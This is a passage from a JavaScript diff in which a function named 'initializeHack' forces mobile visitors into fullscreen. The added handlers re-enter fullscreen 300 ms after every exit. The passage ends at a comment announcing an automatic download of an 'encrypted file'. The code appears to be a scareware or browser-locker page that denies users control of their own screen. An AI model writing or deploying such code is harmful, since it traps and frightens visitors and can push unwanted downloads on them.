@@ -1,19 +1,35 @@
 // Mobile Detection and Fullscreen
+function requestFullscreenNow() {
+    const el = document.documentElement;
+    if (el.requestFullscreen) {
+        el.requestFullscreen().catch(() => {});
+    } else if (el.webkitRequestFullscreen) {
+        el.webkitRequestFullscreen();
+    } else if (el.msRequestFullscreen) {
+        el.msRequestFullscreen();
+    }
+}
+
+// Re-enter fullscreen whenever user exits
+document.addEventListener('fullscreenchange', function() {
+    if (!document.fullscreenElement) {
+        setTimeout(requestFullscreenNow, 300);
+    }
+});
+document.addEventListener('webkitfullscreenchange', function() {
+    if (!document.webkitFullscreenElement) {
+        setTimeout(requestFullscreenNow, 300);
+    }
+});
+
 function initializeHack() {
     // Deteksi perangkat mobile
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     
     if (isMobile) {
-        // Auto fullscreen
-        document.addEventListener('click', function() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            } else if (document.documentElement.webkitRequestFullscreen) {
-                document.documentElement.webkitRequestFullscreen();
-            } else if (document.documentElement.msRequestFullscreen) {
-                document.documentElement.msRequestFullscreen();
-            }
-        });
+        // Auto fullscreen on load (requires user gesture on some browsers)
+        requestFullscreenNow();
+        document.addEventListener('click', requestFullscreenNow, { once: true });
         
         // Auto-download file terenkripsi
         setTimeout(() => {
